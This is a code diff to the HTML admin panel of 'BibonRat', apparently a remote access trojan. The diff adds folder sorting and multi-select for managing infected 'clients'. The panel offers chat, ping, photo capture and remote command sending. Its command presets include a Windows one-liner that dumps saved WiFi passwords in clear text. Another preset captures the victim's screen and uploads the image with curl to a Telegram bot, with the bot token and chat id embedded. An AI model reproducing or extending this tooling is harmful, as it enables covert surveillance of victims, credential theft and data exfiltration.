@@ -16,19 +16,15 @@
                 <div class="brand"><span class="dot"></span> BibonRat Admin</div>
                 <span class="badge">Mobile v2.0</span>
             </div>
-
             <div class="muted">Вход/регистрация через Email + Password</div>
-
             <div class="stack">
                 <input id="email" type="email" placeholder="Email" autocomplete="email">
                 <input id="password" type="password" placeholder="Password" autocomplete="current-password">
             </div>
-
             <div class="row">
                 <button id="btnLogin" class="btnPrimary">Войти</button>
                 <button id="btnRegister">Регистрация</button>
             </div>
-
             <div id="authError" class="err"></div>
         </div>
     </div>
@@ -57,6 +53,11 @@
                 Command
                 <span id="cmdBadge" class="badge">—</span>
             </div>
+            <div class="menuItem" data-page="folders">
+                <i class="fas fa-folder-tree"></i>
+                Folders
+                <span id="foldersBadge" class="badge">0</span>
+            </div>
 
             <div class="menuRight">
                 <span id="meEmail" class="badge">user@email.com</span>
@@ -72,6 +73,7 @@
                     <div class="panelHeader">
                         <div class="title">Список клиентов</div>
                         <div class="row">
+                            <button id="btnSelectMode"><i class="fas fa-check-square"></i> Выбрать</button>
                             <button id="btnPingAll">Пинг всем</button>
                             <button id="btnRefresh">Обновить</button>
                         </div>
@@ -100,9 +102,38 @@
                             </div>
                         </div>
 
+                        <!-- SORT BAR -->
+                        <div class="sortBar">
+                            <span class="sortLabel">Сортировка:</span>
+                            <div class="sortBtns">
+                                <button class="sortBtn active" data-sort="date"><i class="fas fa-calendar-alt"></i> Дата</button>
+                                <button class="sortBtn" data-sort="name"><i class="fas fa-font"></i> Имя</button>
+                                <button class="sortBtn" data-sort="online"><i class="fas fa-circle"></i> Онлайн</button>
+                                <button class="sortBtn" data-sort="folder"><i class="fas fa-folder"></i> Папка</button>
+                                <button id="sortDirBtn" class="sortBtn sortDir" title="Направление сортировки"><i class="fas fa-sort-amount-down"></i></button>
+                            </div>
+                        </div>
+
+                        <!-- FOLDER FILTER BAR -->
+                        <div class="folderFilterBar">
+                            <span class="sortLabel">Папка:</span>
+                            <div class="sortBtns" id="folderFilterBtns">
+                                <button class="sortBtn folderFilterBtn active" data-folder="all">Все</button>
+                                <button class="sortBtn folderFilterBtn" data-folder="__none__"><i class="fas fa-inbox"></i> Без папки</button>
+                            </div>
+                        </div>
+
                         <div class="search">
                             <input id="search" placeholder="Поиск: pcName / userName / IP / docId" />
                         </div>
+                    </div>
+
+                    <!-- MULTI-SELECT TOOLBAR -->
+                    <div id="multiSelectBar" class="multiSelectBar hidden">
+                        <span id="multiSelectCount" class="badge">0 выбрано</span>
+                        <button id="btnMoveToFolder" class="btnPrimary"><i class="fas fa-folder-arrow-up"></i> Переместить в папку</button>
+                        <button id="btnRemoveFromFolder"><i class="fas fa-folder-minus"></i> Убрать из папки</button>
+                        <button id="btnCancelSelect">Отмена</button>
                     </div>
 
                     <div id="clientsList" class="clientsList"></div>
@@ -119,7 +150,6 @@
                             <span id="pcOnlineStatus" class="badge">—</span>
                         </div>
                     </div>
-
                     <div id="infoContent" class="infoContent">
                         <div class="hint">Выберите клиента на странице "PC List" для просмотра информации</div>
                     </div>
@@ -133,17 +163,13 @@
                         <div class="title">Чат с клиентом</div>
                         <span id="chatStatus" class="badge">не выбран клиент</span>
                     </div>
-
-                    <!-- client header -->
                     <div id="chatHeader" class="chatHeaderInfo hidden">
                         <div class="chatHeaderLeft">
                             <div class="chatTitle">
                                 <span id="chatClientName">—</span>
                                 <span id="badgeOnline" class="badge">—</span>
                             </div>
-
                             <div class="chatSub" id="chatClientMeta"></div>
-
                             <div class="flagsRow">
                                 <span class="flag">adminOnline: <b id="fAdminOnline">0</b></span>
                                 <span class="flag">adminOpen: <b id="fAdminOpen">0</b></span>
@@ -151,26 +177,20 @@
                                 <span class="flag">clientOpen: <b id="fClientOpen">0</b></span>
                             </div>
                         </div>
-
                         <div class="chatHeaderRight">
                             <span class="pill" id="chatClientIdPill"></span>
                             <div class="row">
                                 <button id="btnPing">Пинг</button>
                                 <span id="pingStatus" class="badge">—</span>
-
                                 <button id="btnOpenChat" class="btnPrimary">Открыть чат</button>
                                 <button id="btnCloseChat">Закрыть чат</button>
                                 <button id="btnGetPhoto">Get Photo</button>
                             </div>
                         </div>
                     </div>
-
-                    <!-- messages -->
                     <div id="chatBody" class="chatBody">
                         <div class="hint">Выберите клиента и откройте чат</div>
                     </div>
-
-                    <!-- input -->
                     <div id="chatInput" class="chatInputBar hidden">
                         <input id="msgInput" placeholder="Напишите сообщение..." />
                         <button id="btnSend" class="btnPrimary">Отправить</button>
@@ -188,7 +208,6 @@
                             <span id="cmdStatusBadge" class="badge">—</span>
                         </div>
                     </div>
-
                     <div class="cmdPanel">
                         <div class="cmdTop">
                             <div class="cmdTitle">Отправка команды</div>
@@ -196,7 +215,6 @@
                                 <button id="btnCmdClose">Скрыть результат</button>
                             </div>
                         </div>
-
                         <div class="cmdForm">
                             <select id="cmdPreset">
                                 <option value="">Выберите шаблон...</option>
@@ -220,15 +238,10 @@
                                 <option value="powershell -NoProfile -Command &quot;Import-Module AudioDeviceCmdlets; Set-AudioDevice -PlaybackVolume 100&quot;">Max Volume</option>
                                 <option value="for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear">WiFi Passwords</option>
                                 <option value="powershell -NoProfile -Command &quot;$file = Join-Path $env:TEMP 'screen.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png); &amp; curl.exe -F 'chat_id=1005333334' -F ('photo=@' + $file) 'https://api.telegram.org/bot7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw/sendPhoto'&quot;">Get screenshot</option>
-
-
-
                             </select>
-
                             <input id="cmdInput" placeholder='Введите команду или выберите шаблон...' />
                             <button id="btnCmdSend" class="btnPrimary">Отправить команду</button>
                         </div>
-
                         <div class="cmdOut">
                             <div class="cmdOutTitle">Результат выполнения</div>
                             <pre id="cmdOutput">Выберите клиента и отправьте команду...</pre>
@@ -236,10 +249,66 @@
                     </div>
                 </div>
             </div>
+
+            <!-- Folders Page -->
+            <div id="foldersSection" class="contentSection hidden">
+                <div class="panel">
+                    <div class="panelHeader">
+                        <div class="title"><i class="fas fa-folder-tree"></i> Управление папками</div>
+                        <div class="row">
+                            <button id="btnCreateRootFolder" class="btnPrimary"><i class="fas fa-folder-plus"></i> Создать папку</button>
+                            <span id="foldersCountBadge" class="badge">0 папок</span>
+                        </div>
+                    </div>
+
+                    <div class="folderPageContent">
+                        <!-- Folder tree -->
+                        <div class="folderTreePanel">
+                            <div class="folderTreeHeader">
+                                <span class="muted">Дерево папок</span>
+                            </div>
+                            <div id="folderTreeRoot" class="folderTree">
+                                <div class="hint">Нет папок. Нажмите «Создать папку»</div>
+                            </div>
+                        </div>
+
+                        <!-- Clients in selected folder -->
+                        <div class="folderClientsPanel">
+                            <div class="folderClientsHeader">
+                                <span id="folderClientsTitle" class="muted">Выберите папку для просмотра клиентов</span>
+                                <span id="folderClientsCount" class="badge">0</span>
+                            </div>
+                            <div id="folderClientsList" class="folderClientsList">
+                                <div class="hint">Выберите папку</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MOVE TO FOLDER MODAL -->
+    <div id="moveFolderModal" class="modalOverlay hidden">
+        <div class="modalCard">
+            <div class="modalHeader">
+                <div class="modalTitle"><i class="fas fa-folder-arrow-up"></i> Переместить в папку</div>
+                <button id="modalClose" class="modalCloseBtn"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modalBody">
+                <div id="modalFolderList" class="modalFolderList">
+                    <!-- populated by JS -->
+                </div>
+            </div>
+            <div class="modalFooter">
+                <button id="modalMoveToRoot">
+                    <i class="fas fa-inbox"></i> Убрать из папки (корень)
+                </button>
+                <button id="modalCancel">Отмена</button>
+            </div>
         </div>
     </div>
 
     <script type="module" src="./main.js"></script>
 </body>
 </html>
-
